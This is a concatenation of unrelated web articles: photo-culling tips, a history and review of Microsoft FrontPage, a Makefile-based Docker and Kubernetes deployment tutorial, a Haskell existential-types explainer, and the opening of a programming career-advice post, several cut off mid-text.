<li>Remember that it is easier to select than to delete hundreds of photos.</li>
<li>You need to take a second look at the album, especially if you need more photos to send your clients.</li>
</ul>
<h2 id="you-dont-use-the-right-photo-editing-and-culling-software">You Don’t Use the Right Photo Editing and Culling Software</h2>
<p>There are many photo editing and culling software in the market that offers help for photographers and editors. However, it would help if you considered the following criteria when choosing software:</p>
<h3 id="the-software-can-detect-exposure-problems">The software can detect exposure problems:</h3>
<p>Most simply, exposure is how light or dark the image will appear when the camera captures it. With this, the culling software that you need to use should have an exposure algorithm. The algorithm can detect whether the human subject is extremely over or underexposed.</p>
<p>AI is essential in this kind of software to ensure that you get the best results. Don’t hesitate to add images that don’t have humans as their subjects because some software can still detect exposure in the photos.</p>
<h3 id="it-can-detect-out-of-focus-images-and-blurred-images">It can detect out of focus images and blurred images.</h3>
<p>Another algorithm that you need to look for in culling software is the Blur Algorithm or its capacity to identify intentional blur from unintentional blur.</p>
<p>The algorithm is usually 90% accurate in detecting which subjects are blurry in the photo and to how much extent.</p>
<h3 id="it-can-detect-closed-eyes-subjects-in-the-images">It can detect closed eyes subjects in the images.</h3>
<p>Some photographers go the extra mile in editing closed eyes in photographs. However, if you have thousands of photos that you can choose from, then it’s best to use software that can help you choose photos with subjects that have open eyes.</p>
<p>Choose software that has the AI to detect the distance between the upper and lower eyelids. This way, it can detect whether the eyes are unintentionally closed or half-closed in the photos.</p>
<h2 id="you-are-not-critical-when-choosing-your-photos">You are Not Critical when Choosing Your Photos</h2>
<p><img src="https://filterpixel.com/images/choose-your-photos.jpeg" alt="You are Not Critical when Choosing Your Photos" title="You are Not Critical when Choosing Your Photos"></p>

<p>Photographers have different styles and approaches. Therefore, you need to follow your gut first when culling photos. This gut instinct develops over the years in the industry, but don’t worry if you are still new in your profession.</p>
<p>Again, you can choose to use photo culling software in your process to aid you with selection. You’ll be able to develop a keen and faster gut reaction in the future as long as you practice and follow your workflow.</p>
<h2 id="you-forget-to-rate-your-photos">You Forget to Rate Your Photos</h2>
<p><img src="https://filterpixel.com/images/forgot-rating-photos.jpeg" alt=""></p>

<p>We need to go back to the idea of not deleting photos when it comes to rating photos. So, again, instead of deleting pictures, you can filter them out using the star rating in Lightroom.</p>
<p>Once you’ve culled photos from your software, take a second look, and rate the images. You can add a star for your pictures that you want to provide to your client. Two stars can also be used as additional photos for the album. Lastly, those with three stars are for your online and offline publication.</p>
<p>Honestly, these tips accompanied by the best photo editing and culling software will surely help make your job easier.</p>

	<p>PLEASE don't use FrontPage for modern web development! It's filled with security vulnerabilities and obsolete standards. The goal of this is not to convince you otherwise. The newest version came out almost two decades ago!</p>

<p>Microsoft FrontPage. The mere mention of that name is making most (if not all) of you seasoned web devs groan. "FrontPage was utter rubbish from dark ages of GeoCities" you say. "Everything it touched was ruined with horrific output and proprietary nonsense!" And yes, it was.</p>
<p>But... FrontPage as a concept. As a dream of what could have been, and a window into what <em>was</em>. Letting the typical home user at the time create websites, express creativity, and conquer the world by storm, all without being forced to learn HTML or CSS or JavaScript... In that regard, FrontPage couldn't be beat.</p>
<p>Let's talk about why Microsoft FrontPage was for a brief period of time the ultimate content creation tool of the Internet, and why it later fell from grace.</p>
<h2>History</h2>
<p>Before we can talk about goodness and ugliness, we need to talk about carphones and business meetings. Because this was 1994, when the Internet was still really new. At that point in time most internet chatter occured on Usenet groups (think something like Reddit) or BBS systems (think something like <a href="https://invisibleup.com/articles/5/">old AOL</a>; example pictured below). If you needed buisness stuff, like stocks or the such, you had to log onto the BBS of whoever had what you needed. This was kind of a pain.</p>
<p><img alt="A picture of a BBS (tilde.town) as of today" src="https://invisibleup.com/articles/33/BBS.png"></p>
<p>Enter Randy Forgaard and Charles H. Ferguson. Ferguson, renowned computer industry consultant, contacted MIT graduate Forgaard (over carphone, in case you were wondering) to discuss starting a new, internet-based company.</p>
<p>His idea was that many corporations such as the Dow Jones, Bloomberg, Apple, etc. were sinking millions into building their own, completely incompatible dial-in Internet services. Therefore, they should create a standardized, completely open server/client combo to replace all the independent efforts. This hopefully would reduce the cost of development for those corporations, and provide a market for growth by making buisnesses <em>want</em> to have an Interent presence.</p>
<p>The two decided to found their own company, Vermeer Technologies, Inc. A month later, still in the planning stages, they caught wind of the brand new World Wide Web out of CERN. It was decentralized, open, and even more robust than they were planning. It was just about perfect. The only issue was that it was rather a pain to make websites if you were just some lowly advertising manager or whoever. The web needed an authoring tool for websites.</p>
<p><img alt="FrontPage 1.0a, taken from WinWorldPC.com" src="https://invisibleup.com/articles/33/FP-1.0.png"></p>
<p>So, somehow, they managed to hire many professional coders for no salary whatsoever to work on FrontPage. (Early start-up culture, perhaps?) Evidently it worked, as FrontPage was released (only!) a week behind schedule on October of 1995. By then the World Wide Web was exploding, with a 20% increase in sites <em>per month</em>. FrontPage also managed to explode, receiving many awards and positive reviews. In fact, it was so good that Microsoft ended up buying them out. According to them, not only did it feel like a native Office application, it was perfect for their ongoing plan to become more internet centric.</p>
<p><img alt="FrontPage 97, taken from WinWorldPC.com" src="https://invisibleup.com/articles/33/FP-97.png"></p>
<p>FrontPage over the years got integrated into the Office suite and made a flagship product for Microsoft productivity products. By Office 2000, FrontPage had more Office integration than you should shake a stick at; nailing down the Office user interface and allowing imports and exports across the whole suite. There's... other stuff as well, but let's stay positive for now.</p>
<p>I'll be covering FrontPage 2002, as that's the version I own, and the one I have the most experience with.</p>
<h2>The Good</h2>
<p>The interface... is (in my opinion) one of the best interfaces for any program ever. No hyperbole. I think only the other Microsoft applications of the era like PowerPoint and Visio can top it. I can <em>see</em> why it won awards.</p>
<p><img alt="FrontPage's start screen with no webs open" src="https://invisibleup.com/articles/33/FP-Start.png"></p>
<p>Like any other Microsoft Office XP program, there's the sidebar on the right with common tasks. What you'll probably want to do is, of course, make a new site.</p>
<p>FrontPage's equivalent to "projects" are called "Webs". These Webs contain the files (all your HTML, CSS, images, etc.) and preferences (such as which web server to sync up with or what compatibility settings to use) for that website.</p>
<p><img alt="FrontPage's template selector" src="https://invisibleup.com/articles/33/FP-NewWeb.png"></p>
<p>Start by selecting a new "Empty Web". Up pops a bunch of templates, including the "Empty Web" template. A bit odd, but sure.</p>
<p><img alt="The &quot;Personal Homepage&quot; template in action" src="https://invisibleup.com/articles/33/FP-Template.png"></p>
<p>If you <em>were</em> to choose a template, it would give you a pre-populated fill-in-the-blanks site ready for your words and pictures. It takes some of the layout work and design originality out of it, but that <em>is</em> the purpose of a template after all. (Although, as a word of advice, <em>don't use these.</em> They're rather awfully designed from a web standards point of view. You can see it barely fitting in my window there. Imagine that on a smartphone.)</p>
<p><img src="https://invisibleup.com/articles/33/FP-BlankWeb.png" alt="FrontPage open to a new blank web. Folder list and Views bar are visible."></p>
<p>Anyways, once you open your blank web, you get... nothing! (That's what you asked for, isn't it?) No worries. Really, if you think about it, it would be rather silly to start making a page off the bat. You see, FrontPage takes a <em>project oriented</em> approach to things. While you easily <em>could</em> just sit down and start banging stuff out, that's really not the way FrontPage wants you to go.</p>
<p><img alt="FrontPage Navigation editor with some pages created and linked up." src="https://invisibleup.com/articles/33/FP-NavView.png"></p>
<p>Here's probably my favorite FrontPage feature: the Navigation editor. Here you create blank pages and link them together in a logical hierarchy. This closely resembles the process you'd usually take on paper when designing a website.</p>
<p><img alt="Navigation bar settings dialog" src="https://invisibleup.com/articles/33/FP-Navbar.png"></p>
<p>With this hierarchy, you can automatically create a navigation bar in all your pages that are properly linked. If you decide to make a new top-level page, for instance, every page on your site will be updated to feature that page. (To replicate that feature on this site, I had to use some pretty tricky template scripting with my custom Flask server. I'd vastly prefer something like this.)</p>
<p>This feature is also nice because it forces you to <em>think about your site</em>. You can't just sit down like it's Microsoft Word and bang out some pages. You need a coherent plan. Before you can even start, you need to sit down with your client/team/self and ask "What do you want on your website?" To most people it's obvious that you need a website. Everybody has a website. What's significantly less obvious is <em>what</em> needs to be on the website. And FrontPage's web editor allows you to play around with hierarchies and layouts before commiting to anything.</p>
<p><img alt="PowerPoint Slide Sorter mode&quot;" src="https://invisibleup.com/articles/33/PPT-SlideSorter.png"></p>
<p>One thing that's intersting is that Word, PowerPoint and Access all (vaguely) follow a similar model. Word has the Outline editor, PowerPoint has the Slide Sorter mode (pictured above, showing an interactive game I made when I was 11), and Access, being a typical database program, requires you to declare your tables before you can work on them.</p>
<p>What's even more interesting is that, with the exception of Access (which not many people used, mostly due to its cost and relative rarity), you were never <em>required</em> to have a plan before starting. Most people I've seen use Word just do straight typing, or perhaps work off another document with an outline. But the option was there! One could do their outline <em>in their document</em> and flesh out around that. Likewise with PowerPoint, as well.</p>
<p><img alt="Highlighted template include code" src="https://invisibleup.com/articles/33/FP-TemplateInclude.png"></p>
<p>Another common task in web design is defining a "template" page where you fill all your content into. For example, every page on this site you're reading on now has the same header and footer, and every article has the same sort of thumbnail image at the top. That was all scripted using template features.</p>
<p>FrontPage, being an Office product, supports templates. The implementation admittedly is <em>super</em> janky, but it's there. You can include pages within other pages just fine, it's just a little tricky to set up. (FYI, Word, Excel, and PowerPoint do templates too. It's one of their lesser-known features, IMHO.)</p>
<p><img alt="Report view window" src="https://invisibleup.com/articles/33/FP-Reports.png"></p>
<p>Another really neat feature: reports. Like a compiler in an IDE, FrontPage produces warnings, errors, and statistics for your site. At a glance I can view all broken links, orphaned pages, oversized images, etc. This is a <em>fantastic</em> feature, something that modern web dev software just <em>doesn't</em> have.</p>
<p><img alt="Hyperlinks view window" src="https://invisibleup.com/articles/33/FP-Links.png"></p>
<p>In the same vein as the Reports, you can see at a glance what links to what. It's a lot like the call chart in a software development IDE. I can see quickly every site linked from any page (shown here is <a href="https://invisibleup.com/articles/24/">the Sonic R color fix article</a>) and any subpages.</p>
<p><img alt="Tasks view, showing a task labeled &quot;Write FrontPage article&quot;" src="https://invisibleup.com/articles/33/FP-Tasks.png"></p>
<p>Last feature, although this isn't nearly as useful in the year 2020. In the tasks view, you can put up a list of tasks that needs to be accomplished. Already that seems rather nice for keeping track of what you need to do. It's a lot like GitHub or GitLab's issue tracker, in a sense.</p>
<p>However, if you connect to a server with FrontPage Web Extensions (I'll get to that...), you can share this task list with other people. You can (again, like an issue tracker) put up a task to be done by someone else and work on a task that somebody else put up. It's a <em>very</em> nice feature for web development, but nowadays this is normally handled by source control providers like GitHub or GitLab.</p>
<p><img alt="FrontPage editing the Sonic R color mod article" src="https://invisibleup.com/articles/33/FP-Editor.png"></p>
<p>And, of course, there's the webpage editor. This works almost exactly like Microsoft Word, with some web-flavored spice. You type words and they appear in the page. You make those words blue, they're blue. <em>That said</em>, when you edit elements like that, it inserts an HTML 3.2 style <code>&lt;FONT&gt;</code> tag instead of trying to match it to a CSS rule. There's ways around this, but you have to be very diligent in doing so. This is mostly just due to FrontPage being a product of its time, though.</p>
<p>FrontPage is a program about planning, executing, and reviewing. Take the Navigation editor. You plan out the content of your site. You sketch up the layout.

<p>If you’re anything like me you have made many “new” projects for the web. Perhaps a little website, an API or some little test thing for your friend.&nbsp;</p>



<p>And then: <em>you need to deploy</em>. The first time it’s usually still fine. You’ve done this before. You build your Dockerfile, recycle an old kubespec / deployment.yaml and <code>kubectl apply -f my-app.yaml</code> It’s online; life is good.&nbsp;</p>



<h3><strong>This article is really about what comes after that</strong></h3>



<p>You find a problem. Fix it in your code, docker build the image again, push it. Re-run kubectl apply. Refresh. hmm. the fix doesn’t show up!?</p>



<p><em>The problem is that Kubernetes (and Docker) don’t automatically pull a new version of your image when you don’t change the name of your image.</em></p>



<p>In this article I’m going to help you make the best, simplest, reproducible deployments possible.&nbsp; You may not know about ‘Make’, and if you mostly do .js or python it may feel a bit oldscool. But it’s actually very simple to use, and much more friendly than building your own ‘deploy.sh’ or ‘deploy.py’. Make will be the basis of what I show here.</p>



<p>In this guide I’m going to add the build steps one by one.</p>



<h3><strong>Step 1: Building your Dockerfile</strong></h3>



<p>I’ll assume this is nothing new to you. Instead I will just give you my two best tips:</p>



<ul><li>Docker has two build engines, the newer is called Docker Buildkit, and can be called with docker buildx build . it is <em>much smarter </em>for things like caching. Use it like so: <code>docker buildx build -t my_repo/project .</code></li><li>Do expensive installs before copying in your code, this will help Docker leverage the caching and be much faster. For web projects this means I’ll do:</li></ul>



<pre><code>FROM node:14

WORKDIR /app/
COPY package.json
RUN npm install
# and only then
COPY . . </code></pre>



<p>Ok, now we’re going to use <strong>Make</strong> to make our life easier. Just make a file named <code>makefile</code> and put in the following content:&nbsp;</p>



<pre><code>dockerize:
	docker buildx build -t my_repo/project .</code></pre>



<p>Now you can do <code>make dockerize</code> and it will save you a lot of typing! — We’re going to do more of that. Note I call it ‘dockerize’ because you may want to also ‘build’ for just a local building of the project.</p>







<h3><strong>Step 2 – Pushing it to the Docker Hub</strong></h3>



<p>Now we’ll also add a step in the Makefile to push it to the Docker hub, like so:</p>



<pre><code>image=my_repo/project

dockerize:
	docker buildx build -t $(image) .

push:
	docker push $(image)</code></pre>



<p>Notice that I’m introducing a variable here. image. If you define them at top of your Makefile they will be are available throughout your file.</p>



<p>Great! To make our life easier we can also chain commands like so:</p>



<pre><code>$ make dockerize push</code></pre>



<h3><strong>Step 3 – Deploying it</strong></h3>



<p>Now we’re going to deploy our freshly built and pushed image to our Kubernetes cluster. I’ll assume you have a deployment spec called deployment.yaml which contains something like:</p>



<pre><code>      containers:
        - name: cool-website
          image: my-repo/project</code></pre>



<p>And we add the following to our Makefile</p>



<pre><code>deployment: 
	kubectl deploy -f deployment.yaml

deploy: dockerize push deployment</code></pre>



<p>The deployment part is nothing new. But notice how with deploy we add the verbs after deploy? This is to trigger those things <em>first</em></p>



<p>So now we can type make deploy, and Make will do everything for us.</p>



<h3><strong>Step 4 – RE-deploying</strong></h3>



<p>Now, this is where it gets interesting. If you make changes to your code and run make deploy again you’ll notice a new image will be built and deployed, but your deployment will not be updated. This is because the <em>image name</em> didn’t change.&nbsp;</p>



<p>A (wrong)&nbsp; solution is to add ‘imagePullPolicy: always’ to your deployment. And this may actually work for you. But my experience is that it does not always work, and it’s really hard to see which version is running in production.</p>



<p>A better way is to add a version to your image!&nbsp;</p>



<p>Lets consider the following Makefile</p>



<pre><code>image=my_repo/project

dockerize:
	docker buildx build -t $(image):$(version) .

push:
	docker push $(image):$(version)

deployment:
	sed -e 's|:latest|:$(version)|g' deployment.yaml | kubectl apply -f -

deploy: dockerize push deployment</code></pre>



<p>Here we introduce a variable $(version), but instead of defining it in the Makefile you can just define it at runtime, like so:</p>



<pre><code>make deploy version=2</code></pre>



<p>A special note is to be given to the modification to the deployment step. What I do here is to use the Stream Editor ‘sed’ to find and replace the word :latest with the version you specify. So essentially we edit the file and then stream it straight into kubectl to deploy it.</p>



<p>For this to work you need to make sure you tag your image name in your deployment file as image: my-repo/project:latest&nbsp;</p>



<p>Try it! You can now easily deploy new versions.</p>



<h3><strong>Step 5 — Using git</strong></h3>



<p>As you are working on a project a little longer it’s nice to actually refer to a given version ‘running’ to code committed. And luckily ‘git’ allows for showing you which commit you are on. So lets add the following line to the top of our makefile:</p>



<pre><code>version := $(shell git describe --tags --always --abbrev=7 --dirty)</code></pre>



<p>What this line does is call out to the shell and run git describe, which returns information about the current git branch and commit you are on. –tags –always –abbrev=7 and –dirty help to format the returned string into something clear and usable.&nbsp;</p>



<p>&nbsp;If you use this you don’t need to specify the version, and can just type <code>make deploy</code>. Power tip: You can still use <code>version=22</code></p>



<h3>The complete Makefile</h3>



<pre><code>version := $(shell git describe --tags --always --abbrev=7 --dirty)
image=my_repo/project

dockerize:
	docker buildx build -t $(image):$(version) .

push:
	docker push $(image):$(version)

deployment:
	sed -e 's|:latest|:$(version)|g' deployment.yaml | kubectl apply -f -

deploy: dockerize push deployment</code></pre>

<![CDATA[Existential Haskell]]>

November 26, 2020 | https://blog.sumtypeofway.com/posts/existential-haskell.html | <a href="https://web.archive.org/web/*/https://blog.sumtypeofway.com/posts/existential-haskell.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
                    <p>The majority of software engineering literature portrays object-oriented programming as distinct from, and often irreconcilable with, functional programming. This is, of course, a false dichotomy, as the techniques encouraged by functional programming are applicable in even the most object-oriented languages. Yet object-orientation, being perhaps history’s most popular software paradigm, has popularized its tenets, and occasionally we can see them show up even in programming languages like Haskell, a language about as antithetical to the object-oriented philosophy as possible.</p>
<p>In this piece, I’ll describe a common example of <a href="https://en.wikipedia.org/wiki/Information_hiding">information hiding</a> in ALGOL-style languages like Java, then express that in terms compatible with Haskell. We’ll then use this technique to port a <em>responder chain</em> to Haskell, demonstrating how Haskell supports dynamic function dispatch in the presence of hidden type information. I write this not because I expect to break any new ground—all the techniques I use here are long-documented in the literature, and Haskell veterans will probably find little new in this post<span><label for="sn-0"></label><span>Those familiar with the care and feeding of existential types may wish to skip to the penultimate section, which contains a couple useful data types that I haven’t yet seen in the wild.</span></span>—but because the existing resources are scattered, perhaps oddly so given how central dynamic dispatch is to most programming languages that aren’t Haskell, and because exploring the edge cases in the design illustrates the compromises inherent in language and library design.</p>

<p>Most of the world’s statically-typed programming languages allow their users to write code resembling the following Java:</p>
<div id="cb1"><pre><code><span id="cb1-1"><span>public</span> <span>static</span> <span>Comparable</span> <span>someFn</span>() {</span>
<span id="cb1-2">    <span>return</span> <span>"a concrete String value"</span>;</span>
<span id="cb1-3">}</span></code></pre></div>
<p>Syntactically, this code is uncontroversial: it’s a function that returns a value. Its only interesting aspect lies in the function signature−even though the function body returns a value of type <code>String</code>, its return type is declared to be <a href="https://docs.oracle.com/javase/8/docs/api/java/lang/Comparable.html"><code>Comparable</code></a>, which is not a concrete data type, but a Java <a href="https://en.wikipedia.org/wiki/Interface_(computing)">interface</a>. As such, we cannot treat the result of this function call as the <code>String</code> it actually is; we can only interact with it via the methods defined on the <code>Comparable</code> interface. This application of the <a href="https://en.wikipedia.org/wiki/Rule_of_least_power">rule of least power</a> is a useful one, even in a strongly-typed language like Haskell: sometimes we want to hide the implementation details of a function’s return type.</p>
<p>We can try to write the same thing in Haskell:</p>
<div id="cb2"><pre><code><span id="cb2-1"><span>someComparableValue ::</span> <span>Ord</span> a <span>=&gt;</span> a</span>
<span id="cb2-2">someComparableValue _ <span>=</span> <span>"a concrete string value"</span></span></code></pre></div>
<p>Because this is not semantically-valid Haskell, we get the following error:</p>
<pre><code>&lt;interactive&gt;:3:27: error:
    • Couldn't match expected type ‘a’ with actual type ‘[Char]’
      ‘a’ is a rigid type variable bound by
        the type signature for:
          someComparableValue :: forall a. Ord a =&gt; Int -&gt; a
</code></pre>
<p>Haskell’s typechecker looks at the body of this function and says “hey, man, you’re returning a concrete string value here, not ’any type that is <code>Ord</code>–erable.’” Though this is a valid notion in Java, it’s not valid in Haskell. Another perspective on this is that Java allows a value to have more than one type: we can treat a Java string literal as a value of type <code>java.lang.String</code>, or of type<span><label for="sn-1"></label><span>even though <code>Comparable</code> is an interface, not a concrete type</span></span> <code>Comparable</code>, or of its superclass <code>java.lang.Object</code>. However, since Haskell doesn’t support inheritance, Haskell treats its values as having one, and only one, type. Working around this takes a judicious application of an existential type.</p>

<p>In Haskell, an <em>existential</em> data type is one that is defined in terms not of a concrete type, but in terms of a quantified type variable, introduced on the right-hand side of the data declaration. This is, as is the case for so many Haskell concepts, not a particularly helpful definition in the abstract. It’s easier to show than to tell, so let’s take a look at one of the canonical examples of an existential type: a <code>Showable</code> type that wraps any type that implements the <code>Show</code> interface.</p>
<div id="cb4"><pre><code><span id="cb4-1"><span>data</span> <span>Showable</span> <span>=</span> <span>forall</span> a <span>.</span> <span>Show</span> a <span>=&gt;</span> <span>Showable</span> a</span></code></pre></div>
<p>There are several interesting things about this data type. Firstly, it uses the <code>forall</code> keyword to introduce the <code>a</code> type variable: given that we’re dealing with <em>exist</em>-ential types, it threw me for a loop that there wasn’t an <code>exists</code> keyword.<span><label for="sn-2"></label><span>Scala reserves a <code>forSome</code> keyword for this purpose, which I think reads a little more accurately in terms of the intent of introducing this type variable: using the phrase “for all” is a bit inapposite given that the <code>Showable</code> constructor is applied to single values at a time.</span></span> Considering the constructor of <code>Showable</code> is perhaps more enlightening:</p>
<div id="cb5"><pre><code><span id="cb5-1">λ<span>&gt;</span> <span>:</span>t <span>Showable</span></span>
<span id="cb5-2"><span>Showable</span><span> ::</span> <span>forall</span> a <span>.</span> <span>Show</span> a <span>=&gt;</span> a <span>-&gt;</span> <span>Showable</span></span></code></pre></div>
<p>We can read this as “<code>Showable</code> is a constructor that takes, for all types <code>a</code> such that <code>a</code> implements <code>Show</code>, an <code>a</code> value, and returns a value of type <code>Showable</code>, the internal <code>a</code> value of which is no longer visible to the world once it’s been applied.”</p>
<p>Secondly, we can’t use a <code>newtype</code> to declare an existential. Attempting to write the following:</p>
<div id="cb6"><pre><code><span id="cb6-1"><span>newtype</span> <span>Showable</span> <span>=</span> <span>forall</span> a <span>.</span> <span>Show</span> a <span>=&gt;</span> <span>Showable</span> a</span></code></pre></div>
<p>results in an error message:</p>
<pre><code>• A newtype constructor cannot have a context in its type
  Showable :: forall a. Show a =&gt; a -&gt; Showable
• In the definition of data constructor ‘Showable’
  In the newtype declaration for ‘Showable’
</code></pre>
<p>When we consider typeclasses as <a href="https://blog.sumtypeofway.com/posts/fluent-polymorphism-type-applications.html">dictionaries</a>, this restriction makes more sense: in GHC Core, this <code>Show a</code> constraint will be represented as a hypothetical <code>ShowDict</code> data type containing implementations for the <code>show</code>, <code>showsPrec</code>, and <code>showList</code> functions. In this light, we can see that <code>Showable</code> takes <em>two</em> parameters, not one: an <code>a</code> value to wrap, as well as the <code>ShowDict</code> dictionary associated with that value’s type. Newtypes exist to wrap single values, and here we’re wrapping both a datum and its associated <code>Show</code> dictionary: as a result, here we need a <code>data</code> declaration, even though the associated <code>Showable</code> constructor takes only one value (in Haskell surface syntax). This is an understandable limitation, though it would be cool if existential values of this sort could opt into the <code>deriving</code> mechanism in the manner of newtypes.</p>
<p>A third interesting thing: we can’t write a function that unwraps this data type. What might seem like an intuitive type for the function is rejected:</p>
<div id="cb8"><pre><code><span id="cb8-1"><span>-- GHC will reject this.</span></span>
<span id="cb8-2"><span>unwrapShowable ::</span> <span>Showable</span> <span>-&gt;</span> (<span>forall</span> a <span>.</span> <span>Show</span> a <span>=&gt;</span> a)</span>
<span id="cb8-3">unwrapShowable (<span>Showable</span> a) <span>=</span> a</span></code></pre></div>
<p>We can see this explained a little more closely if we use the record selector syntax.</p>
<div id="cb9"><pre><code><span id="cb9-1"><span>data</span> <span>Showable</span> <span>=</span> <span>forall</span> a <span>.</span> <span>Show</span> a <span>=&gt;</span> <span>Showable</span> {<span> getShowable ::</span> a }</span></code></pre></div>
<p>Attempting to use <code>getShowable</code> as a function that extracts some arbitrary <code>Show</code>–inhabiting type produces a well-explained error messages:</p>
<pre><code>&lt;interactive&gt;:1:1: error:
    • Cannot use record selector ‘getShowable’ as a function due to escaped type variables
      Probable fix: use pattern-matching syntax instead
    • In the expression: getShowable
</code></pre>
<p>The mental model I use here is that applying a constructor of an existential type serves as a sort of <a href="https://en.wikipedia.org/wiki/Event_horizon">event horizon</a> for type information. In other languages we can assemble heterogenous lists natively; in Haskell, by contrast, we have to opt into it explicitly: applying the <code>Showable</code> constructor to a value swallows its type information. We can’t write a function, whether the hand-written <code>unwrapShowable</code> or descending from our <code>getShowable</code> record selector, that unwraps some arbitrary type out of an existential. All that is retained is the ability, given a proper <code>case</code> statement to unwrap the value within the existential, to <code>Show</code> the value contained therein: it cannot <em>escape</em> its scope, as the error message above explains<span><label for="sn-3"></label><span>We can, however, use the <code>getShowable</code> record selector to update the wrapped value present in a <code>Showable</code>.</span></span>.</p>
<p>We can, as I mentioned above, cross the event horizon with a <code>case</code> statement, binding the <code>Show</code>–conforming contents to a variable name:</p>
<div id="cb11"><pre><code><span id="cb11-1"><span>let</span> shown <span>=</span> <span>case</span> x <span>of</span> <span>Showable</span> val <span>-&gt;</span> <span>show</span> val</span></code></pre></div>
<p>Inside the right-hand-side of this <code>case</code> statement, we have a value <code>x</code> in scope. A quick inquiry with type holes reveals the type we expect:</p>
<pre><code>• Relevant bindings include
    x :: a (bound at &lt;interactive&gt;:28:15)
  Constraints include Show a (from &lt;interactive&gt;:28:11-15)
</code></pre>
<p>All we know about this value <code>x</code> is that we can call <code>Show</code> on it. Other than passing it to the basic combinators (<code>id</code> and <code>const</code>), that’s <em>all we can do</em> with this value. Any bit of type information has been lost, replaced instead with <em>capabilities</em>, via typeclasses. Again, when we consider typeclasses as dictionary parameters, we can visualize how this works on a core-calculus level: we discard type information, including only the relevant dictionaries provided by the context of the <code>forall</code>.</p>
<p>A fourth and final interesting thing about this type is that you can write it, using the <code>GADTs</code> GHC extension, without an explicit <code>forall</code> keyword:</p>
<div id="cb13"><pre><code><span id="cb13-1"><span>data</span> <span>Showable</span> <span>where</span></span>
<span id="cb13-2">  <span>Showable</span><span> ::</span> <span>Show</span> a <span>=&gt;</span> a <span>-&gt;</span> <span>Showable</span></span></code></pre></div>
<p>This stems from the fact that GADTs allow us to introduce per-constructor type variables and associated constraints, even if the type variable is not visible externally. Another thing to note is that data declarations containing existential values don’t have to be limited to a single value: they can hold concrete values, or values expressed with more <code>forall</code>–introduced type variables.</p>

<p>Being able to hide implementation details of a function’s return type is all well and good, but many users are going to need to convert (or attempt to convert) from an existential type back into a concrete type. Java provides this functionality with the <code>instanceof</code> operator and its cast syntax:</p>
<div id="cb14"><pre><code><span id="cb14-1"><span>Comparable</span> c = <span>someFn</span>();</span>
<span id="cb14-2"><span>if</span> c <span>instanceof</span> <span>String</span> {</span>
<span id="cb14-3">    <span>System</span>.<span>out</span>.<span>println</span>(<span>"Got a string: "</span> + (<span>String</span>)c);</span>
<span id="cb14-4">} <span>else</span> {</span>
<span id="cb14-5">    <span>System</span>.<span>out</span>.<span>println</span>(<span>"Casting to a String here would raise a ClassCastException"</span>);</span>
<span id="cb14-6">}</span></code></pre></div>
<p>This is a consequence of all Java objects descending from <code>java.lang.Object</code>, and the ability of the <code>instanceof</code> operator to query the type of an object at runtime. Though …</p></section></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="text"><p>I could probably achieve 300% more in 6 years as a programmer if I knew these things when I started.</p>
<h2 id="coding-is-not-about-the-coding">Coding Is Not About The Coding</h2>
<p>What do you think programming is about?</p>
<p>Writing code?</p>
<p>Writing good code?</p>
<p><strong>No.</strong></p>
<p>It's just a part of the truth.</p>
<p><strong>Programming is not about coding, programming is about solving problems with coding.</strong></p>
<p>End customers don’t care what technologies, languages, frameworks, or methodologies you use. They care only about one thing, whether your product solves their problem or not.</p>
<p>That’s why no one cares what technologies Google search is using under the hood. Until people can find relative information with it, they will use it.</p>
<p>It’s the number one thing I wish I knew when I started programming.</p>
<p>I would spend less time writing “best code” and more time solving customer’s problems best.</p>
<p><strong>Don’t write code just to write code, solve customer’s problems with the code.</strong></p>
<h2 id="communication-skills-more-important-than-coding-skills">Communication Skills More Important Than Coding Skills</h2>
<p>When I just started my career, lack of social skills was not my main problem. But when I moved higher, to the middle, senior, and leadership position, my weak soft skills became my Achilles heel.</p>
<p>When you work on a product with a group of different people (engineers, designers, managers), communication is the only thing that makes you a “team” and helps you effectively develop the product.</p>
<p>Lack of social skills does the opposite, it decreases the product development time and overall productivity.</p>
<p>Here is the real situation you might face:</p>
<p>The leadership team tells your product manager that they want to create a new product feature and put it in the next product release. It’s not urgent, they just want to release it as soon as possible (as always).</p>
<p>The product Manager calls you on Zoom, tells you what you need to build, and asks, <em>“How much time do you need to build it?”</em></p>
<p>You are doing a rough calculation and tell, <em>“I need 20 hours.”</em></p>
<p>The Product Manager is not satisfied with your answer. He wants to release it as soon as possible and show the management that he can deliver results fast (this is a very common situation).</p>
<p>So he asks you, <em>“Can you build it for 10 hours? We really need this feature in the next product release!”</em></p>
<p>And you know that you can if you cut the corners (no tests, messy code) but then you will need to refactor it, and it will take an additional 30 hours. Because other engineers will work with your messy code when you release it. And after refactoring, you will need to integrate their code with yours.</p>
<p>So here’s what will happen next. If you have bad social skills, you will not convince the Product Manager that you actually need 20 hours to build this feature. </p>
<p>Why?</p>
<p>Product Managers often have good social skills, from my experience. So if you can’t convince him that refactoring later is worse than spending 20 hours right now, he will easily argue with you and convince you that “refactoring later is okay.” And the whole team will lose additional 30 hours for this refactoring (I don't count the time to fix unpredictable bugs after).</p>
<p>But if you have good communication skills you will be able to convince him of the opposite.</p>
<p><strong>So improve your social skills as well as coding skills</strong> (send memes in the group chats on Slack or something).</p>
<p>And remember one simple truth:</p>
<p><strong>People work with people, not machines.</strong></p>
<h2 id="regular-breaks-help-to-program-better">Regular Breaks Help To Program Better</h2>
<p>For 4 years I always feel exhausted after work. Somehow I could productively work only for a couple of hours. After that, I didn't have much energy. Until I learned about the Pomodoro technique.</p>
<p>It’s quite simple. You work for 25 minutes and take a break for 5 minutes.</p>
<p>Your working routine becomes:</p>
<p>8:00-8:25 – Work</p>
<p>8:25-8:30 – Break</p>
<p>8:30-8:55 – Work</p>
<p>8:55-9:00 – Break</p>
<p>…</p>
<p>I tried it for a week and was surprised at how focused, energetic, and productive I became  (<a target="_blank" href="https://www.focusboosterapp.com/blog/the-science-behind-the-pomodoro-technique/">the science behind Pomodoro</a>)</p>
<p>Then I went further and implemented the <a target="_blank" href="https://twitter.com/nickbulljs/status/1303037682294173699">52+17 system</a> and my productivity levels spiked by 200%.</p>
<p><strong>So</strong> <strong>take regular breaks if you want to operate at your maximum capabilities.</strong></p>
<h2 id="10x-engineers-dont-exist">10X Engineers Don’t Exist</h2>
<p>At the beginning of my career, I thought that a great programmer is a person who knows tons of programming languages, frameworks, and methodologies.</p>
<p><strong>I was wrong.</strong></p>
